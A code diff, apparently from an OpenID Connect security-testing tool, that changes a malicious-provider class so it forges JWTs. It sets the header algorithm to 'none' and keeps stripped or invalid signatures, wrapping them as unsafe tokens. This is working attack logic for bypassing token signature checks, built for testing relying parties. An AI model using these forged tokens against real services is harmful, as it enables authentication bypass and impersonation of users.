@@ -17,6 +17,8 @@
 package de.rub.nds.oidc.server.op;
 
 import com.nimbusds.jose.JOSEException;
+import com.nimbusds.jose.JWSAlgorithm;
+import com.nimbusds.jose.JWSHeader;
 import com.nimbusds.jose.util.Base64URL;
 import com.nimbusds.jwt.JWT;
 import com.nimbusds.jwt.PlainJWT;
@@ -56,7 +58,8 @@ public class SignatureManipulationOP extends DefaultOP {
 
 				Base64URL newPayload = origJwt.getPayload().toBase64URL();
 
-				SignedJWT newJwt = new SignedJWT(newHdr64, newPayload, newSig64);
+				//SignedJWT newJwt = new SignedJWT(newHdr64, newPayload, newSig64);
+				JWT newJwt = new UnsafeJWT(newHdr64, newPayload, newSig64);
 				return newJwt;
 			} else if (sigInvalid) {
 				Base64URL newHdr64 = origJwt.getHeader().toBase64URL();
@@ -70,11 +73,13 @@ public class SignatureManipulationOP extends DefaultOP {
 				SignedJWT newJwt = new SignedJWT(newHdr64, newPayload, newSig64);
 				return newJwt;
 			} else if (sigNone) {
-				Base64URL newHdr64 = origJwt.getHeader().toBase64URL();
+				JSONObject newHdr = origJwt.getHeader().toJSONObject();
+				newHdr.put("alg", "none");
+				Base64URL newHdr64 = Base64URL.encode(newHdr.toString());
 
 				Base64URL newPayload = origJwt.getPayload().toBase64URL();
 
-				JWT newJwt = new PlainJWT(newHdr64, newPayload);
+				JWT newJwt = new UnsafeJWT(newHdr64, newPayload);
 				return newJwt;
 			} else {
 				return jwt;
@@ -82,6 +87,22 @@ public class SignatureManipulationOP extends DefaultOP {
 		} catch (java.text.ParseException ex) {
 			throw new ParseException(ex.getMessage(), ex);
 		}
+	}
+
+	protected static JWSHeader copyJwsHeader(JWSAlgorithm newAlg, JWSHeader oldHeader) {
+		return new JWSHeader.Builder(newAlg)
+				.contentType(oldHeader.getContentType())
+				.criticalParams(oldHeader.getCriticalParams())
+				.customParams(oldHeader.getCustomParams())
+				.jwk(oldHeader.getJWK())
+				.jwkURL(oldHeader.getJWKURL())
+				.keyID(oldHeader.getKeyID())
+				.type(oldHeader.getType())
+				.x509CertChain(oldHeader.getX509CertChain())
+				.x509CertSHA256Thumbprint(oldHeader.getX509CertSHA256Thumbprint())
+				.x509CertThumbprint(oldHeader.getX509CertThumbprint())
+				.x509CertURL(oldHeader.getX509CertURL())
+				.build();
 	}
 
 }
